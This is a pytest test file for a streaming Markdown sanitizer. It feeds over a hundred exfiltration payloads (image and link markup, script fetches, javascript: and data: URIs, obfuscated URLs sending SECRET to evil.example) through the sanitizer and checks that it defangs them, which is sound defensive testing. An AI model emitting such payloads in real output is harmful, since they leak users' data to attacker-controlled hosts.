"""Known exfiltration payloads (each streamed whole, char-by-char and in random-ish splits) plus
exact-output checks for the rules ADR-0011 spells out."""

from __future__ import annotations

import pytest

from module_e1.e1_support import ALLOWED, links, sanitize, split_at, stream, violations

CANONICAL = ALLOWED[0]  # https://docs.example.com/guide

PAYLOADS = [
    # images: inline, reference-style, nested in links, HTML
    "![x](http://evil.example/p.png?d=SECRET)",
    "![x](//evil.example/p.png)",
    "![x](/relative/fetch-from-origin.png)",
    "![x][r]\n\n[r]: http://evil.example/p.png",
    "![x]\n\n[x]: http://evil.example/p.png",
    f"[![x](http://evil.example/p.png)]({CANONICAL})",
    '<img src="http://evil.example/p.png">',
    "<IMG SRC=http://evil.example/p.png>",
    '<svg><image href="http://evil.example/x"/></svg>',
    "<picture><source srcset=http://evil.example/x></picture>",
    # links: inline, reference, autolink, javascript/data, look-alikes
    "[click](http://evil.example/?q=SECRET)",
    '[click](http://evil.example "title")',
    "[click](<http://evil.example/a b>)",
    "[click][r]\n\n[r]: http://evil.example",
    "[r]\n\n[r]: <http://evil.example> 'title'",
    "> [r]: http://evil.example\n\n[r]",
    "- [r]: http://evil.example\n\n[r]",
    "[click](javascript:alert(document.cookie))",
    "[click](JAVASCRIPT:alert(1))",
    "[click](data:text/html;base64,PHNjcmlwdD4=)",
    "<javascript:alert(1)>",
    "<http://evil.example/?q=SECRET>",
    "<me@evil.example>",
    f"[docs]({CANONICAL}?leak=SECRET)",
    f"[docs]({CANONICAL}.evil.example)",
    "[docs](https://docs.example.com.evil.example/guide)",
    "[docs](http://docs.example.com/guide)",
    "[a](http://evil.example)[b](http://evil.example)",
    "[[nested](http://evil.example)](http://evil.example)",
    f"[[nested](http://evil.example)]({CANONICAL})",
    # bare URLs (GFM autolinks) and escapes/entities that decode into them
    "see http://evil.example/?q=SECRET now",
    "see www.evil.example now",
    "see WWW.EVIL.EXAMPLE now",
    "mail me@evil.example now",
    "mailto:me@evil.example xmpp:me@evil.example",
    # Unicode/IDN e-mail domains, linkify local parts, dotless mailto (round-2 P1)
    "write a@évil.com",
    "write a@evil.рф",
    "mail me@例え.jp",
    "mailto:;@evil.example?body=SECRET",
    "mailto:a@localhost and MAILTO:a@b",
    "x;$,=&+@evil.example and é@evil.example",
    "me<javascript:x>@évil.com",
    "mailto<javascript:x>:a@b",
    "see www\\.evil.example now",
    "see http\\://evil.example now",
    "see http:\\/\\/evil.example now",
    "see http&#58;//evil.example now",
    "see www&#46;evil.example now",
    "see http\\p://evil.example",
    "(http://evil.example)",
    "*http://evil.example*",
    "http://evil.example/`x`",
    "``http://evil.example``x",
    "`a`http://evil.example`b`",
    # protocol-relative and look-alike colons (linkify's `//` schema)
    "see //evil.example/x?d=SECRET now",
    "see http\uff1a//evil.example now",
    "see http&#x3A;//evil.example now",
    "a/<javascript:x>/evil.example",
    # a dropped or rewritten construct INSIDE a word must not glue it into a URL
    "see https<data:x>://evil.example/?d=SECRET now",
    "ww<javascript:x>w.evil.example/?d=SECRET",
    "ww[](javascript:x)w.evil.example",
    "w[ww](http://zzz).evil.example",
    "me<javascript:x>@evil.example",
    "ht<javascript:x>tp<data:x>://evil.example",
    "w<javascript:x>w<javascript:x>w<javascript:x>.evil.example",
    "https[:](http://zzz)//evil.example",
    "me[@](data:x)evil.example",
    "ww<http://zzz>w.evil.example",
    "a" * 500 + "<javascript:x>" + "a" * 500 + "<javascript:x>http://evil.example",
    "[ww](http://zzz)<javascript:x>w.evil.example",
    # raw HTML
    "<script>fetch('http://evil.example')</script>",
    "<div>\n![x](http://evil.example)\n</div>",
    "<!-- http://evil.example -->",
    '<a href="http://evil.example">x</a>',
    "<style>@import url(http://evil.example)</style>",
    # padding past the hold limit
    "[" + " " * 600 + "](http://evil.example)",
    "![" + "a" * 511 + "](http://evil.example)",
    "<" + "a" * 600 + "http://evil.example>",
    "`" + "x" * 600 + "http://evil.example` tail",
    "a" * 600 + "http://evil.example",
    "a" * 510 + "www.evil.example",
    "[" * 600 + "x](http://evil.example)",
    # fences and containers
    "- item\n```\n![x](http://evil.example)\n```\n",
    "> quote\n```\n![x](http://evil.example)\n```\n",
    "- item\n\n```\n![x](http://evil.example)\n```\n![y](http://evil.example)\n",
    "| a |\n|---|\n```\n![x](http://evil.example)\n```\n",
    "  ```\n![x](http://evil.example)\n  ```\n",
    "```js `x`\n![x](http://evil.example)\n```\n",
    "~~~\ncode\n```\n![x](http://evil.example)\n",
    "```\ncode\n~~~\n![x](http://evil.example)\n",
    "````\ncode\n```\n![x](http://evil.example)\n",
    "```\ncode\n``` x\n![x](http://evil.example)\n",
    "```\ncode\n    ```\n![x](http://evil.example)\n",
    "- ~~~\n![x](http://evil.example)\n~~~\n",
    "> ~~~\n> ![x](http://evil.example)\n~~~\n![x](http://evil.example)\n",
    "a\r```\r![x](http://evil.example)\r```\r![y](http://evil.example)",
    "a\r\n```\r\ncode\r\n```\r\n![y](http://evil.example)",
    # tables split code spans at pipes
    "| `x|[a](http://evil.example)` |\n|---|\n",
    "| a | b |\n|---|---|\n| `x | y` [z](http://evil.example) |",
    # double-escaping and backslash games
    "\\\\[x](http://evil.example)",
    "\\[x](http://evil.example)",
    "x\\",
    "\\`[x](http://evil.example)\\`",
]


def _splits(text: str) -> list[list[str]]:
    return [
        [text],
        list(text),
        split_at(text, range(0, len(text), 7)),
        split_at(text, range(3, len(text), 64)),
    ]


@pytest.mark.parametrize("payload", PAYLOADS)
def test_e1_payload_never_renders_exfiltration(payload: str) -> None:
    whole = sanitize(payload)
    for chunks in _splits(payload):
        rendered = ""
        for event in stream(chunks):
            rendered += event
            assert not violations(rendered), (chunks, rendered, violations(rendered))
        assert rendered == whole
    assert not violations(sanitize(whole)), "double-feeding must stay safe"


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        # links survive only on exact normalized match and always carry the STORED canonical URL
        (f"[docs]({CANONICAL})", f"[docs](<{CANONICAL}>)"),
        ("[docs](https://DOCS.Example.COM/guide)", f"[docs](<{CANONICAL}>)"),
        ("[docs](https://u:p@docs.example.com:443/guide)", f"[docs](<{CANONICAL}>)"),
        ("[docs](https://docs.example.com/guide#intro)", f"[docs](<{CANONICAL}#intro>)"),
        ("[docs](https://docs.example.com/guide#a%22b)", f"[docs](<{CANONICAL}>)"),
        ("[docs](https://docs.example.com/guide/)", "docs"),
        ("[docs](http://docs.example.com/guide)", "docs"),
        ("[docs](https://docs.example.com/guide?x=1)", "docs"),
        ("[*b* `c`](https://docs.example.com/guide)", f"[\\*b\\* \\`c\\`](<{CANONICAL}>)"),
        # images and HTML
        ("a ![x](http://evil.example/p.png) b", "a \\[image removed\\] b"),
        ("a ![x][r] b", "a \\!\\[x\\]\\[r\\] b"),
        ("<b>x</b>", "\\<b>x\\</b>"),
        ("a <javascript:alert(1)> b", "a  b"),
        ("[x](javascript:alert(1))", "x"),
        # reference definitions removed; reference links become text
        ("[r]: http://evil.example\n[x][r]", "\n\\[x\\]\\[r\\]"),
        ("> [r]: http://evil.example 'title'\n", "> \n"),
        ("[Note]: this is prose", "\\[Note\\]: this is prose"),
        # bare URLs defanged inside a code span the URL cannot break out of
        ("go http://evil.example/a.b now", "go `http://evil[.]example/a[.]b` now"),
        ("go www.evil.example, now", "go `www[.]evil[.]example`\\, now"),
        # a backtick ends the run, so URL and the (unclosed) code that follows stay separate
        ("go http://e.example/`x`` now", "go `http://e[.]example/`\\`x\\`\\` now"),
        ("mail me@evil.example", "mail `me@evil[.]example`"),
        ("write a@évil.com", "write `a@évil[.]com`"),
        ("mailto:;@evil.example?body=SECRET", "`mailto:;@evil[.]example?body=SECRET`"),
        ("mailto:a@b", "`mailto:a@b`"),
        ("me@home and user@host", "me@home and user@host"),
        # the joined word is checked: the run that completes a URL is defanged
        ("ww<javascript:x>w.evil.example", "ww`w[.]evil[.]example`"),
        ("me<data:x>@evil.example", "me`@evil[.]example`"),
        ("see //evil.example now", "see `//evil[.]example` now"),
        ("<http://evil.example>", "`http://evil[.]example`"),
        # code spans pass verbatim when closed on the line, are escaped otherwise
        ("a `[x](http://e.example)` b", "a `[x](http://e.example)` b"),
        ("a ``x ` y`` b", "a ``x ` y`` b"),
        ("a `open\nnext", "a \\`open\nnext"),
        ("| `a|b` |", "| \\`a|b\\` |"),
        # fences: only unambiguous top-level ones
        ("```py\n[x](http://e)\n```\nok", "```py\n[x](http://e)\n```\nok"),
        ("- a\n```\n[x](http://e)\n```", "- a\n\\`\\`\\`\nx\n\\`\\`\\`"),
        ("- a\n~~~\nb", "- a\n\\~~~\nb"),
        # plain markdown formatting is preserved
        (
            "# Title\n\n- **bold** _it_ ~~s~~\n1. x | y",
            "# Title\n\n- **bold** _it_ ~~s~~\n1. x | y",
        ),
        ("a & b &amp; c", "a \\& b \\&amp; c"),
        ("x\\\ny", "x\\\ny"),
        ("C:\\path", "C:\\\\path"),
    ],
)
def test_e1_exact_outputs(raw: str, expected: str) -> None:
    assert sanitize(raw) == expected
    assert not violations(sanitize(raw))


def test_e1_allowed_bare_url_becomes_canonical_link() -> None:
    out = sanitize("see https://DOCS.example.com/guide. Then www.docs.example.com/x")
    assert links(out) == [CANONICAL]
    assert not violations(out)


def test_e1_allowed_link_actually_renders() -> None:
    """Guard against a sanitizer that is 'safe' only because it destroys every link."""
    out = sanitize(f"Read [the guide]({CANONICAL}#setup), <{ALLOWED[1]}> and {CANONICAL}")
    assert links(out) == [f"{CANONICAL}#setup", ALLOWED[1], CANONICAL]


def test_e1_poisoned_allow_list_entries_are_ignored() -> None:
    poisoned = ["javascript:alert(1)", "data:text/html,x", "https://ok.example/a\nb", "/rel"]
    out = sanitize("[a](javascript:alert(1)) [b](data:text/html,x) [c](/rel)", poisoned)
    assert links(out) == []


def test_e1_overflow_flush_can_never_complete_later() -> None:
    """Once a held `[` overflows it is emitted escaped, so the `](url)` tail can never complete
    the link: the padded text is never a link label (the allow-listed URL itself may still be
    linked as a bare URL, with itself as the label)."""
    padded = "[" + "x" * 600 + f"]({CANONICAL})"
    for chunks in ([padded], list(padded)):
        out = "".join(stream(chunks))
        assert out.startswith("\\[")
        assert "\\]\\(" in out
        assert links(out) == [CANONICAL]
        assert f"[https\\:\\/\\/docs\\.example\\.com\\/guide](<{CANONICAL}>)" in out
    evil = sanitize("[" + " " * 600 + "](http://evil.example)")
    assert links(evil) == []
    assert not violations(evil)
